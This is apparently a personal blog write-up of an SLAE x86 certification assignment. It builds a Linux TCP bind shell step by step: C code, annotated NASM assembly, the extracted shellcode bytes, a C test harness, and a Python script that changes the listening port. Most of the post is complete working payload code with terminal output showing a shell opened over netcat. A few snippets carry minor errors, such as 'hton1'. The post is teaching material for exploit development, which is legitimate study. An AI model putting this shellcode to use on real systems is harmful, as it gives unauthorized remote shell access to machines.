---
title:  "SLAE x86 Assignment 1: TCP Bind Shell"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
categories:
  - exploit dev
classes: wide
tags:
  - exploit dev
  - slae
---

Hey guys! Welcome to my first SLAE x86 Assignments post! This series of posts aims to fulfil the requirements of the SLAE x86 certification from Pentester Academy, while also making shellcoding easier to understand for people just starting out in the field of exploit development. Let's begin with assignment 1!

## Understanding the objective ##
In order to effectively understand what the shellcode must do, it is a good idea to start off by breaking down the code's major working parts. The shellcode must do the following:

- Creates and configures a socket
- Binds an IP and port to that socket
- Listens for a connection and accepts it
- Duplicates standard file descriptors, so that the shell can interact with the socket
- Spawns a shell

Now that we have an outline for our TCP bind shell, let's write a little C code that does this for us, in order to get a better understanding of how socket functions work.

```c
// SLAE Assignment 1: Shell Bind TCP (Linux/x86)
// Author:  4p0cryph0n
// Website:  https://4p0cryph0n.github.io

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main()
{
    //Defining Address Structure
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4443); //Port no.
    addr.sin_addr.s_addr = htonl(INADDR_ANY); //Use any interface to listen

    //Create and Configure Socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    //Bind Socket
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    //Listen
    listen(sockfd, 0);

    //Accept
    int stdfd = accept(sockfd, NULL, NULL);

    //Duplicate Standard File Descriptors
    for (int i = 0; i <= 2; i++)
    {
        dup2(stdfd, i);
    }

    //Execute Shell
    execve("/bin/sh", NULL, NULL);
    return 0;  
}
```

#### Defining the Address Structure
```c
//Defining Address Structure
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(4443); //Port no.
addr.sin_addr.s_addr = hton1(INADDR_ANY); //Use any interface to listen
```
This part of the code is responsible for defining the address family, port, and interface parameters, based on which we create our socket. Executing `man 7 ip` gives us a better understanding of the IP Address format:

```
Address format
       An IP socket address is defined as a combination of an IP interface  address  and  a
       16-bit  port  number.   The basic IP protocol does not supply port numbers, they are
       implemented by higher level protocols  like  udp(7)  and  tcp(7).   On  raw  sockets
       sin_port is set to the IP protocol.
```

```c
struct sockaddr_in {
   sa_family_t    sin_family; /* address family: AF_INET */
   in_port_t      sin_port;   /* port in network byte order */
   struct in_addr sin_addr;   /* internet address */
};

/* Internet address. */
struct in_addr {
   uint32_t       s_addr;     /* address in network byte order */
};
```
Also note that we use ```htons``` and ```hton1``` functions to convert the address and port to Big Endian (network byte order).
```INADDR_ANY``` basically means that the socket will use all the interfaces available on the computer, basically takes the value of ```NULL```.

#### Creating and Configuring the socket
```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
```
The ```socket()``` function takes three arguments, shown by the manpage exerpt below. These parameters will be stored in the ```sockfd``` variable for later use in binding, listening and accepting:

```c
#include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int socket(int domain, int type, int protocol);
```
- ```int domain```: This variable is used to specify a protocol family which will be used for communication. In our case, we will be using IPv4 which is specified by ```AF_INET```.
- ```int type```: The type of socket. ```SOCK_STREAM``` in our case, which is used for two-way communication for TCP sockets.
- ```int protocol```: Protocol to be used with the socket. We can also use 0 in our case.

#### Binding the Socket
```c
//Bind Socket
bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
```
This is where we assign an IP and port to the socket, using the ```sockfd``` variable from before, along with the address structure and the size of the address structure, which is supposed to be 16 bytes.

#### Listening and Accepting
```c
//Listen
listen(sockfd, 0);

//Accept
int stdfd = accept(sockfd, NULL, NULL);
```
The ```listen()``` function takes two arguments:
- ```int sockfd```: The socket descriptor from before.
- ```int backlog```: Used to specify the queueing of connections. In our case, we set ```backlog``` to 0, as there is only one connection that we need to be concerned with.

The ```accept()``` function takes three arguments:
- ```int sockfd```: The socket descriptor from before.
- ```struct sockaddr *addr```: The IP of the host. ```NULL``` in our case, as we don't need setup anything for the peer socket.
- ```struct sockaddr *addr```: The addr length of the peer socket. Again, ```NULL```.

After this, the program starts listening for any incoming connections. After it receives one, the ```accept()``` will return a file descriptor for the accepted socket. This is what we will use in order to duplicate the standard file descriptors.

#### Duplicating Standard File Descriptors
```c
//Duplicate Standard File Descriptors
for (int i = 0; i < 3; i++)
{
    dup2(stdfd, i);
}
```
We need to duplicate stdin, stdout and stderr to the socket in order to redirect input and output from the connection to the socket.

#### Executing a shell
```c
//Execute Shell
execve("/bin/sh", NULL, NULL);
return 0;
```
To execute a shell, we use ```execve```, and the ```/bin/sh``` binary. Let's run this!
```
Terminal 1:
$ gcc shell.c -o shell
$ ./shell

Terminal 2:
$ nc -nv 127.0.0.1 4443
(UNKNOWN) [127.0.0.1] 4443 (?) open
pwd
/home/kali/Desktop/SLAE_Practice/SLAEx86_Assignments/ass1
```
Now  that we know the structure of our program, let's start writing the assembly version!

## Assembly Time! ##
Note that in order to make a call like ```bind```, ```accept```, ```listen```, etc, we will need to use the ```int socketcall()``` syscall, which has the syscall number 102, or ```0x66``` in hex. It takes the following arguments:

```int socketcall(int call, unsigned long *args);```

Let's start off by gathering the call numbers. These are stored in ```/usr/include/linux/net.h```. The ones that we need are:
```
#define SYS_SOCKET      1               /* sys_socket(2)                */
#define SYS_BIND        2               /* sys_bind(2)                  */
#define SYS_LISTEN      4               /* sys_listen(2)                */
#define SYS_ACCEPT      5               /* sys_accept(2)                */
```
Now, we will need to find the identifiers for the ```sockfd``` arguments:
- ```AF_INET```: Found in ```/usr/include/bits/socket.h```:
```
#define PF_INET         2       /* IP protocol family.  */
#define AF_INET         PF_INET
```
- ```SOCK_STREAM```: Found in ```/usr/include/bits/socket_type.h```:
```
SOCK_STREAM = 1, /* Sequenced, reliable, connection-based byte streams.  */
```
- ```int protocol```: Found in ```/usr/include/linux/in.h```:
```
IPPROTO_IP = 0, /* Dummy protocol for TCP */
```

Perfect. Let's begin writing the code.

We start off by zeroing the registers using the ```xor``` instruction. Each register will now have the value of ```0x00000000```, which may prevent crashes while testing out the shellcode.
```nasm
xor eax, eax
xor ebx, ebx
xor ecx, ecx
cdq               ;clears edx
```
Let's create the socket now. The way in which ```socketcall()``` works is, the ebx register takes the call number, and ECX takes a pointer to the arguments of that call.
```nasm
; create socket s=socket(2,1,0)
mov al, 0x66
inc ebx           ;ebx=1
push edx          ;0
push ebx          ;1
push 0x2          ;2
mov ecx, esp      ;pointer to args
int 0x80          ;syscall
mov esi, eax      ;sockfd
```
Keep in mind that as the stack grows downwards, we push the arguments in reverse order. Here, we use the previously found ```sockfd``` identifiers:
- 2: ```AF_INET```
- 1: ```SOCK_STREAM```
- 0: ```IPPROTO_IP```
A pointer to these arguments will then be stored in ecx, and the syscall will then be executed using ```int 0x80```. This will return the socket descriptor in eax, and we store a pointer to that in esi for later use.

Now we will create the address structure and call the ```bind()``` function.
```nasm
; create addr struc and bind(s, 2,port,0, 16)
mov al, 0x66
inc ebx          ;ebx=2
push edx         ;0
push word 0x5b11 ;4443
push word bx     ;2
mov ecx, esp     ;pointer to args
push 0x10        ;16
push ecx         ;addr struc
push esi         ;stockfd
mov ecx, esp     ;pointer to args
int 0x80         ;syscall
```
This time, we increment (```inc```) ebx by 1, which means that now it has the value of 2, which is an identifier for the ```bind()``` call. We start by pushing 0 (which is stored in ebx) to the top of the stack, corresponding to the dummy protocol. This is followed by pushing the port number, and the value of 2, which corresponds to ```AF_INET```, and then we store a pointer to these arguments in ecx. This makes up the address structure.

Then we push the address structure length (16) onto the the stack, along with a pointer to the previous arguments for ```bind()```. The ```bind()``` function takes ```sockfd``` as its first argument, so we push the pointer to that (stored in esi from before) onto the stack. After that, we finally store a pointer to all arguments in ecx, and execute the syscall.

Now, we setup ```listen()``` and ```accept()``` in a similar fashion.
```nasm
; listen(s,0)
xor eax, eax     ;eax=0
mov al, 0x66		
inc ebx          ;ebx=3
inc ebx          ;ebx=4
push ebx         ;4 --> SYS_LISTEN
push esi         ;sockfd
mov ecx, esp     ;pointer to args
int 0x80         ;syscall

; accept(s,0,0)
mov al, 0x66
inc ebx          ;ebx=5 --> SYS_ACCEPT
push edx         ;0 --> addrlen
push edx         ;0 --> sockaddrr
push esi         ;sockfd
mov ecx, esp     ;pointer to args
int 0x80         ;syscall
mov edi, eax     ;new fd that we get from accept (we will use this for duping)
```
Just keep in mind that ```accept()``` will return a file descriptor which we need to store for later use, in order to duplicate the standard file descriptors.

Let's duplicate the standard file descriptors. We will use a loop for this.
```nasm
xor ecx, ecx     ;ecx=0
mov cl, 0x3      ;counter for loop. Iterating for 3 stdfds
dup2:
xor eax, eax     ;eax=0
mov al, 0x3f     ;syscall number for dup2
mov ebx, edi     ;new fd from accept() moved into ebx
dec cl           ;ecx=2
int 0x80         ;syscall
jnz dup2         ;keep looping until the 0 flag is set
```
And finally we use ```execve``` to execute ```/bin/sh```.
```nasm
;execve
xor ecx, ecx     ;ecx=0
push ecx         ;pushing the null
push byte 0x0b   ;print syscall
pop eax          ;eax=11
push 0x68732f2f  ;pushing /bin/sh in reverse order
push 0x6e69622f
mov ebx, esp     ;pointer to args
int 0x80         ;syscall
```
This is the final code:
```nasm
; SLAE Assignment 1: Shell Bind TCP Shellcode (Linux/x86)
; Author:  4p0cryph0n
; Website:  https://4p0cryph0n.github.io

global _start:

section .text
_start:

        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        cdq

        ; create socket s=socket(2,1,0)
        mov al, 0x66
        inc ebx           ;ebx=1
        push edx          ;0
        push ebx          ;1
        push 0x2          ;2
        mov ecx, esp      ;pointer to args
        int 0x80          ;syscall
        mov esi, eax      ;sockfd

        ; create addr struc and bind(s, 2,port,0, 16)
        mov al, 0x66
        inc ebx          ;ebx=2
        push edx         ;0
        push word 0x5b11 ;4443
        push word bx     ;2
        mov ecx, esp     ;pointer to args
        push 0x10        ;16
        push ecx         ;addr struc
        push esi         ;stockfd
        mov ecx, esp     ;pointer to args
        int 0x80         ;syscall

        ; listen(s,0)
        xor eax, eax     ;eax=0
        mov al, 0x66		
        inc ebx          ;ebx=3
        inc ebx          ;ebx=4
        push ebx         ;4 --> SYS_LISTEN
        push esi         ;sockfd
        mov ecx, esp     ;pointer to args
        int 0x80         ;syscall

        ; accept(s,0,0)
        mov al, 0x66
        inc ebx          ;ebx=5 --> SYS_ACCEPT
        push edx         ;0 --> addrlen
        push edx         ;0 --> sockaddrr
        push esi         ;sockfd
        mov ecx, esp     ;pointer to args
        int 0x80         ;syscall
        mov edi, eax     ;new fd that we get from accept (we will use this for duping)

        ;duplicating stdfds
        xor ecx, ecx     ;ecx=0
        mov cl, 0x3      ;counter for loop. Iterating for 3 stdfds
        dup2:
        xor eax, eax     ;eax=0
        mov al, 0x3f     ;syscall number for dup2
        mov ebx, edi     ;new fd from accept() moved into ebx
        dec cl           ;ecx=2
        int 0x80         ;syscall
        jnz dup2         ;keep looping until the 0 flag is set

        ;execve
        xor ecx, ecx     ;ecx=0
        push ecx         ;pushing the null
        push byte 0x0b   ;print syscall
        pop eax          ;eax=11
        push 0x68732f2f  ;pushing /bin/sh in reverse order
        push 0x6e69622f
        mov ebx, esp     ;pointer to args
        int 0x80         ;syscall
```

Let's extract the shellcode and test it out using ```shellcode.c```:
```
$ objdump -d ./shellcode_tcp_bind|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xc9\x99\x6a\x66\x58\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\x11\x5b\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
```
We paste this in ```shellcode.c```:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x99\x6a\x66\x58\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\x11\x5b\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```
Now lets compile it, and test it out:
```
Terminal 1:

$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode           
shellcode.c:6:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
    6 | main()
      | ^~~~
$ ./shellcode
Shellcode Length:  102

Terminal 2:

$ nc -nv 127.0.0.1 4443
(UNKNOWN) [127.0.0.1] 4443 (?) open
uname -a
Linux kali 5.4.0-kali3-686-pae #1 SMP Debian 5.4.13-1kali1 (2020-01-20) i686 GNU/Linux
```
Boom! it works :)

### Customizable Port
In order to complete this requirement, I've written a very simple python wrapper script that replaces the port in the shellcode with the desired port. Keep in mind that this is extremely simple, and to make this script more useful, checks for port numbers can also be included, along with better length checks.

```python
#!/usr/bin/python

# SLAE Assignment 1: Simple Python Port Change Wrapper Script
# Author:  4p0cryph0n
# Website: https://4p0cryph0n.github.io/

import sys
import socket

port = int(sys.argv[1])

phtons = hex(socket.htons(int(port)))

half1 = phtons[4:]
half2 = phtons[2:4]

if half1 == "00" or half2 == "00":
        print "Port contains NULL"
        exit(1)

shellcode =  '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x6a\\x66\\x58\\x43\\x52'
shellcode += '\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x6a\\x66\\x58'
shellcode += '\\x43\\x52\\x66\\x68\\x11\\x5b\\x66\\x53\\x89\\xe1\\x6a\\x10'
shellcode += '\\x51\\x56\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x43\\x43'
shellcode += '\\x53\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x52\\x52\\x56'
shellcode += '\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x31\\xc0'
shellcode += '\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc9'
shellcode += '\\x51\\x6a\\x0b\\x58\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62'
shellcode += '\\x69\\x6e\\x89\\xe3\\xcd\\x80'

shellcode = shellcode.replace('\\x11\\x5b', '\\x{}\\x{}'.format(half1, half2))
print shellcode
```
Let's try this out with port 1337:
```
$ python2 change_port.py 1337
\x31\xc0\x31\xdb\x31\xc9\x99\x6a\x66\x58\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80

We paste this into shellcode.c, and compile it

Terminal 1:
$ ./shellcode
Shellcode Length:  102

Terminal 2:
$ nc -nv 127.0.0.1 1337
(UNKNOWN) [127.0.0.1] 1337 (?) open
uname -a
Linux kali 5.4.0-kali3-686-pae #1 SMP Debian 5.4.13-1kali1 (2020-01-20) i686 GNU/Linux
```
Annnndddd with this, we finally wrap up Assignment 1. This was fun!

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE - 1534
